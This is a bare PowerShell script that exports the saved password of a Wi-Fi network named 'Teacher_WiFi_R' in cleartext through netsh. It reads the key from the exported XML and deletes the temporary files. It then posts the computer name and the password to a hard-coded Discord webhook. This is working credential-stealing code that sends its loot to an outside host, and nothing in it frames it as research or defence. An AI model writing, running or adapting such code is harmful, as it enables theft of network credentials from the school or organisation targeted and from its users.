$hookUrl = "https://discordapp.com/api/webhooks/1465987971466395773/oYnAK6pdTATSbadnkw-2fraAguGL88gI9NIlKnXijZlkFMeiDmgtgq-VevctXFzQ4C9O"
$ssid = "Teacher_WiFi_R"

$tempPath = Join-Path $env:TEMP "wifi_export"
New-Item -ItemType Directory -Path $tempPath -Force | Out-Null
netsh wlan export profile name="$ssid" folder="$tempPath" key=clear | Out-Null
$xmlFile = Get-ChildItem -Path $tempPath -Filter "*.xml" |
           Where-Object { $_.Name -like "*$ssid*" } |
           Select-Object -First 1

if ($xmlFile) {
    [xml]$xmlContent = Get-Content $xmlFile.FullName
    $wifiPassword = $xmlContent.WLANProfile.MSM.security.sharedKey.keyMaterial
} else {
    $wifiPassword = "not found"
}

Remove-Item $tempPath -Recurse -Force

$content = "# $env:COMPUTERNAME`n"+$wifiPassword
$payload = @{
    content = $content
} | ConvertTo-Json

Invoke-RestMethod -Uri $hookUrl -Method Post -Body $payload -ContentType "application/json"
